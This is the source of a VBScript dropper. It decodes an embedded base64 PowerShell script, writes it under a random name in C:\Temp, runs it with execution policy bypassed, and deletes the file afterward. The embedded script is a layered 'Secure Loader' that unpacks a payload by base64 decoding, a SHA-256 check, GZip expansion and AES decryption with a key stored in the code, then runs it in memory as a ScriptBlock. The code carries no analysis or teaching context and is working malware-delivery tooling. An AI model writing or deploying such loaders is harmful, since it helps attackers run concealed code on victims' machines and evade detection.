Option Explicit

' ===== SHARED MODULE-LEVEL STATE =====
Dim g_encodedPayload, g_tempScriptPath, g_launchCommand
Dim g_fso, g_wshShell, g_isSuccess

' ===== CONSTANTS =====
Const TEMP_DIR = "C:\Temp\"
Const SCRIPT_SUFFIX = ".ps1"
Const PS_LAUNCH_CMD = "powershell.exe -nop -ep bypass -file """

' ===== ENTRY POINT =====
g_encodedPayload = "CiM9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQojIFBTIFNlY3VyZSBMb2FkZXIgLSBMYXllcmVkIEVuZ2luZSAodjIpCiMgICBCYXNlNjQgLT4gR1ppcCAtPiBBRVMtQ0JDL1BLQ1M3IC0+IFNjcmlwdEJsb2NrCiMgICBJbnRlZ3JpdHk6IFNIQS0yNTYgb2YgcGFja2VkIGNpcGhlcnRleHQKIz09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09CgokQjY0X1BheWxvYWQgPSBAJwpINHNJQUFBQUFBQUMvd0VnQU4vL0lPN2o1d2JUdW9sM1R2QXUwTTZmbWxGbDN5amtpd1FlUWxhTzl1eWkwVk9Ib25xQUlBQUFBQT09CidACiRCNjRfS2V5ID0gQCcKTURFeU16UTFOamM0T1dGaVkyUmxaakF4TWpNME5UWTNPRGxoWW1Oa1pXWT0KJ0AKJEI2NF9JViA9IEAnCk1ERXlNelExTmpjNE9XRmlZMlJsWmc9PQonQAokQjY0X1NoYTI1NiA9IEAnCjZZRnoycU9FeVJ2Y0M1eWcreHJaZHBIZWNURWpuT3MrQjlCcWJKMVNDK2M9CidACgpmdW5jdGlvbiBDb252ZXJ0VG8tQnl0ZXMgewogICAgcGFyYW0oW3N0cmluZ10kRW5jb2RlZCkKICAgICR0ID0gKCRFbmNvZGVkIC1yZXBsYWNlICdccycsJycpIC1yZXBsYWNlICctJywnKycgLXJlcGxhY2UgJ18nLCcvJwogICAgc3dpdGNoICgkdC5MZW5ndGggJSA0KSB7IDIgeyAkdCArPSAnPT0nIH0gMyB7ICR0ICs9ICc9JyB9IH0KICAgICxbQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJHQpCn0KCmZ1bmN0aW9uIFRlc3QtSGFzaE1hdGNoZXMgewogICAgcGFyYW0oW2J5dGVbXV0kRGF0YSwgW2J5dGVbXV0kRXhwZWN0ZWQpCiAgICAkc2hhID0gW1N5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuU0hBMjU2XTo6Q3JlYXRlKCkKICAgIHRyeSB7CiAgICAgICAgJGFjdHVhbCA9ICRzaGEuQ29tcHV0ZUhhc2goJERhdGEpCiAgICAgICAgaWYgKCRhY3R1YWwuTGVuZ3RoIC1uZSAkRXhwZWN0ZWQuTGVuZ3RoKSB7IHJldHVybiAkZmFsc2UgfQogICAgICAgICRkaWZmID0gMAogICAgICAgIGZvciAoJGkgPSAwOyAkaSAtbHQgJGFjdHVhbC5MZW5ndGg7ICRpKyspIHsgJGRpZmYgPSAkZGlmZiAtYm9yICgkYWN0dWFsWyRpXSAtYnhvciAkRXhwZWN0ZWRbJGldKSB9CiAgICAgICAgcmV0dXJuICgkZGlmZiAtZXEgMCkKICAgIH0KICAgIGZpbmFsbHkgeyAkc2hhLkRpc3Bvc2UoKSB9Cn0KCmZ1bmN0aW9uIEV4cGFuZC1HWmlwQnl0ZXMgewogICAgcGFyYW0oW2J5dGVbXV0kQ29tcHJlc3NlZCkKICAgICRpbiA9IE5ldy1PYmplY3QgU3lzdGVtLklPLk1lbW9yeVN0cmVhbSAoLCRDb21wcmVzc2VkKQogICAgJGd6ID0gTmV3LU9iamVjdCBTeXN0ZW0uSU8uQ29tcHJlc3Npb24uR1ppcFN0cmVhbSgKICAgICAgICAgICAgICAkaW4sIFtTeXN0ZW0uSU8uQ29tcHJlc3Npb24uQ29tcHJlc3Npb25Nb2RlXTo6RGVjb21wcmVzcykKICAgICRvdXQgPSBOZXctT2JqZWN0IFN5c3RlbS5JTy5NZW1vcnlTdHJlYW0KICAgIHRyeSB7CiAgICAgICAgJGd6LkNvcHlUbygkb3V0KQogICAgICAgICwkb3V0LlRvQXJyYXkoKQogICAgfQogICAgZmluYWxseSB7CiAgICAgICAgJG91dC5EaXNwb3NlKCk7ICRnei5EaXNwb3NlKCk7ICRpbi5EaXNwb3NlKCkKICAgIH0KfQoKZnVuY3Rpb24gSW52b2tlLUFlc0RlY3J5cHQgewogICAgcGFyYW0oW2J5dGVbXV0kQ2lwaGVydGV4dCwgW2J5dGVbXV0kS2V5LCBbYnl0ZVtdXSRJVikKICAgICRhZXMgPSBbU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5BZXNdOjpDcmVhdGUoKQogICAgJGFlcy5LZXkgPSAkS2V5OyAkYWVzLklWID0gJElWCiAgICAkYWVzLk1vZGUgPSAnQ0JDJzsgJGFlcy5QYWRkaW5nID0gJ1BLQ1M3JwoKICAgICRkZWMgPSAkYWVzLkNyZWF0ZURlY3J5cHRvcigpCiAgICAkaW4gID0gTmV3LU9iamVjdCBTeXN0ZW0uSU8uTWVtb3J5U3RyZWFtICgsJENpcGhlcnRleHQpCiAgICAkY3MgID0gTmV3LU9iamVjdCBTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LkNyeXB0b1N0cmVhbSgKICAgICAgICAgICAgICAkaW4sICRkZWMsIFtTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LkNyeXB0b1N0cmVhbU1vZGVdOjpSZWFkKQogICAgJG91dCA9IE5ldy1PYmplY3QgU3lzdGVtLklPLk1lbW9yeVN0cmVhbQogICAgdHJ5IHsKICAgICAgICAkY3MuQ29weVRvKCRvdXQpCiAgICAgICAgLCRvdXQuVG9BcnJheSgpCiAgICB9CiAgICBmaW5hbGx5IHsKICAgICAgICAkb3V0LkRpc3Bvc2UoKTsgJGNzLkRpc3Bvc2UoKTsgJGluLkRpc3Bvc2UoKTsgJGRlYy5EaXNwb3NlKCk7ICRhZXMuRGlzcG9zZSgpCiAgICB9Cn0KCnRyeSB7CiAgICBXcml0ZS1Ib3N0ICdbMS81XSBEZWNvZGluZyBlbWJlZGRlZCBtYXRlcmlhbC4uLicKICAgICRwYWNrZWQgPSBDb252ZXJ0VG8tQnl0ZXMgJEI2NF9QYXlsb2FkCiAgICAka2V5ICAgID0gQ29udmVydFRvLUJ5dGVzICRCNjRfS2V5CiAgICAkaXYgICAgID0gQ29udmVydFRvLUJ5dGVzICRCNjRfSVYKICAgICRoYXNoICAgPSBDb252ZXJ0VG8tQnl0ZXMgJEI2NF9TaGEyNTYKCiAgICBXcml0ZS1Ib3N0ICdbMi81XSBWZXJpZnlpbmcgaW50ZWdyaXR5IG9mIHBhY2tlZCBibG9iLi4uJwogICAgaWYgKC1ub3QgKFRlc3QtSGFzaE1hdGNoZXMgLURhdGEgJHBhY2tlZCAtRXhwZWN0ZWQgJGhhc2gpKSB7CiAgICAgICAgdGhyb3cgJ0ludGVncml0eSBjaGVjayBmYWlsZWQgLS0gY29ycnVwdGVkIHBheWxvYWQuJwogICAgfQoKICAgIFdyaXRlLUhvc3QgJ1szLzVdIEV4cGFuZGluZyBHWmlwIHN0cmVhbS4uLicKICAgICRjaXBoZXJ0ZXh0ID0gRXhwYW5kLUdaaXBCeXRlcyAtQ29tcHJlc3NlZCAkcGFja2VkCgogICAgV3JpdGUtSG9zdCAnWzQvNV0gRGVjcnlwdGluZyBBRVMgcGF5bG9hZC4uLicKICAgICRwbGFpbkJ5dGVzID0gSW52b2tlLUFlc0RlY3J5cHQgLUNpcGhlcnRleHQgJGNpcGhlcnRleHQgLUtleSAka2V5IC1JViAkaXYKICAgICRwbGFpbnRleHQgID0gW1RleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZygkcGxhaW5CeXRlcykKCiAgICBXcml0ZS1Ib3N0ICdbNS81XSBFeGVjdXRpbmcgU2NyaXB0QmxvY2suLi4nCiAgICAkc2IgPSBbU2NyaXB0QmxvY2tdOjpDcmVhdGUoJHBsYWludGV4dCkKICAgICYgJHNiCgogICAgV3JpdGUtSG9zdCAnWytdIERvbmUuJwp9CmNhdGNoIHsKICAgIFdyaXRlLUVycm9yICJbLV0gJCgkXy5FeGNlcHRpb24uTWVzc2FnZSkiCn0K"
g_isSuccess = False

Set g_fso = CreateObject("Scripting.FileSystemObject")
Set g_wshShell = CreateObject("WScript.Shell")

g_isSuccess = StepPrepareDirectory()
If g_isSuccess Then g_isSuccess = StepDecodeAndWrite()
If g_isSuccess Then g_isSuccess = StepInvoke()

StepRemoveArtifacts
If g_isSuccess = False Then WScript.Quit 1

' ===== STEP 1: PREPARE DIRECTORY =====
Function StepPrepareDirectory()
    StepPrepareDirectory = False

    If Not g_fso.FolderExists(TEMP_DIR) Then
        On Error Resume Next
        g_fso.CreateFolder TEMP_DIR
        If Err.Number <> 0 Then
            Emit "FOLDER_ERR: " & Err.Description
            Exit Function
        End If
        On Error GoTo 0
    End If

    g_tempScriptPath = TEMP_DIR & MakeRandomTag() & SCRIPT_SUFFIX
    g_launchCommand = PS_LAUNCH_CMD & g_tempScriptPath & """"

    StepPrepareDirectory = True
End Function

' ===== STEP 2: DECODE AND WRITE SCRIPT =====
Function StepDecodeAndWrite()
    StepDecodeAndWrite = False

    On Error Resume Next

    Dim domDoc, domElement, binaryData, streamObj, targetFile, decodedString

    Set domDoc = CreateObject("MSXML2.DOMDocument")
    Set domElement = domDoc.createElement("b64")
    domElement.DataType = "bin.base64"
    domElement.text = g_encodedPayload
    binaryData = domElement.nodeTypedValue

    Set streamObj = CreateObject("ADODB.Stream")
    With streamObj
        .Type = 1
        .Open
        .Write binaryData
        .Position = 0
        .Type = 2
        .Charset = "utf-8"
        decodedString = .ReadText
        .Close
    End With

    Set targetFile = g_fso.CreateTextFile(g_tempScriptPath, True)
    targetFile.Write decodedString
    targetFile.Close

    If Err.Number = 0 Then
        StepDecodeAndWrite = True
    Else
        Emit "DECODE_ERR: " & Err.Description
    End If

    On Error GoTo 0
End Function

' ===== STEP 3: INVOKE =====
Function StepInvoke()
    StepInvoke = False
    On Error Resume Next
    g_wshShell.Run g_launchCommand, 1, True
    If Err.Number = 0 Then
        StepInvoke = True
    Else
        Emit "RUN_ERR: " & Err.Description
    End If
    On Error GoTo 0
End Function

' ===== CLEANUP =====
Sub StepRemoveArtifacts()
    On Error Resume Next
    If g_fso.FileExists(g_tempScriptPath) Then g_fso.DeleteFile g_tempScriptPath, True
    On Error GoTo 0
End Sub

' ===== UTILITY: GENERATE RANDOM TAG =====
Function MakeRandomTag()
    Const ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    Dim result, counter, index
    result = ""
    Randomize
    For counter = 1 To 8
        index = Int(Rnd() * Len(ALPHABET)) + 1
        result = result & Mid(ALPHABET, index, 1)
    Next
    MakeRandomTag = result
End Function

' ===== UTILITY: EMIT MESSAGE =====
Sub Emit(message)
    WScript.Echo message
End Sub